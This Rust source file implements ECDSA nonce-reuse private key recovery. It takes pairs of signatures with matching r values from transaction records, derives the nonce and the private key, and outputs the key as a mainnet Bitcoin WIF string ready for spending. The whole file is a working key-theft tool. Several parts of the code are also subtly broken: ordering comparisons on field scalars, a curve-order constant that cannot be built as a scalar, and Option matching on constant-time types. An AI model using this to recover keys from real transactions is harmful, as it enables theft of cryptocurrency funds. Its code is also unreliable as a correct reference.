use anyhow::{anyhow, Result};
use k256::{
    ecdsa::Signature as K256Signature,
    Scalar,
    elliptic_curve::PrimeField,
};
use num_bigint::{BigUint, ToBigUint};
use num_traits::{One, Zero, ToPrimitive};
use num_integer::Integer;
use std::str::FromStr;
use crate::types::{SignatureRow, RecoveredKeyRow};

/// Attempts to recover the private key using the ECDSA reused-k attack
/// This attack works when the same k value is used in two different signatures
pub fn attempt_recover_k_and_priv(
    sig1: &SignatureRow,
    sig2: &SignatureRow,
) -> Result<Option<RecoveredKeyRow>> {
    // Parse R, S, and Z values from hex strings
    let r1 = parse_hex_to_scalar(&sig1.r)?;
    let s1 = parse_hex_to_scalar(&sig1.s)?;
    let z1 = parse_hex_to_scalar(&sig1.z)?;
    
    let r2 = parse_hex_to_scalar(&sig2.r)?;
    let s2 = parse_hex_to_scalar(&sig2.s)?;
    let z2 = parse_hex_to_scalar(&sig2.z)?;

    // Check if R values are the same (same k value used)
    if r1 != r2 {
        return Ok(None);
    }

    // Check if Z values are different (different messages)
    if z1 == z2 {
        return Ok(None);
    }

    // Calculate the difference in Z values using modular arithmetic
    // Note: We can't directly compare Scalars, so we'll use subtraction and handle the result
    let z_diff = if z1 >= z2 {
        z1 - z2
    } else {
        // If z1 < z2, we need to handle the modular arithmetic properly
        // In secp256k1, we can add the curve order to make it positive
        let curve_order = Scalar::from_repr([
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE,
            0xBA, 0xAE, 0xDC, 0xE6, 0xAF, 0x48, 0xA0, 0x3B,
            0xBF, 0xD2, 0x5E, 0x8C, 0xD0, 0x36, 0x41, 0x41
        ].into()).unwrap();
        z2 - z1 + curve_order
    };

    // Calculate the difference in S values using modular arithmetic
    let s_diff = if s1 >= s2 {
        s1 - s2
    } else {
        let curve_order = Scalar::from_repr([
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE,
            0xBA, 0xAE, 0xDC, 0xE6, 0xAF, 0x48, 0xA0, 0x3B,
            0xBF, 0xD2, 0x5E, 0x8C, 0xD0, 0x36, 0x41, 0x41
        ].into()).unwrap();
        s2 - s1 + curve_order
    };

    // Calculate the inverse of the S difference - handle CtOption properly
    let s_diff_inv = match s_diff.invert() {
        Some(inv) => inv,
        None => return Ok(None), // No inverse exists
    };

    // Calculate k = (z1 - z2) * (s1 - s2)^(-1) mod n
    let k = z_diff * s_diff_inv;

    // Calculate the private key: priv = (s1 * k - z1) * r^(-1) mod n
    let r_inv = match r1.invert() {
        Some(inv) => inv,
        None => return Ok(None), // No inverse exists
    };

    let priv_key = (s1 * k - z1) * r_inv;

    // Convert private key to WIF format
    let private_key_wif = scalar_to_wif(&priv_key)?;

    Ok(Some(RecoveredKeyRow {
        txid1: sig1.txid.clone(),
        txid2: sig2.txid.clone(),
        r: sig1.r.clone(),
        private_key: private_key_wif,
    }))
}

fn parse_hex_to_scalar(hex_str: &str) -> Result<Scalar> {
    let bytes = hex::decode(hex_str)?;
    if bytes.len() != 32 {
        return Err(anyhow!("Expected 32 bytes for scalar, got {}", bytes.len()));
    }
    
    let mut buf = [0u8; 32];
    buf.copy_from_slice(&bytes);
    
    Scalar::from_repr(buf.into())
        .ok_or_else(|| anyhow!("Invalid scalar value"))
}

fn scalar_to_wif(scalar: &Scalar) -> Result<String> {
    // Convert scalar to bytes
    let bytes = scalar.to_bytes();
    
    // Add version byte (0x80 for mainnet private key)
    let mut wif_bytes = vec![0x80];
    wif_bytes.extend_from_slice(&bytes);
    
    // Add compression flag (0x01 for compressed public keys)
    wif_bytes.push(0x01);
    
    // Double SHA256 hash
    let hash1 = sha2::Sha256::digest(&wif_bytes);
    let hash2 = sha2::Sha256::digest(&hash1);
    
    // Add first 4 bytes of double hash as checksum
    wif_bytes.extend_from_slice(&hash2[..4]);
    
    // Base58 encode
    Ok(base58_encode(&wif_bytes))
}

fn base58_encode(bytes: &[u8]) -> String {
    let alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    let base = 58u32;
    
    let mut num = BigUint::from_bytes_be(bytes);
    let mut result = String::new();
    
    while num > BigUint::zero() {
        let (quotient, remainder) = num.div_rem(&base.to_biguint().unwrap());
        result.push(alphabet.chars().nth(remainder.to_u32().unwrap() as usize).unwrap());
        num = quotient;
    }
    
    // Add leading '1's for each leading zero byte
    for &byte in bytes {
        if byte == 0 {
            result.push('1');
        } else {
            break;
        }
    }
    
    result.chars().rev().collect()
}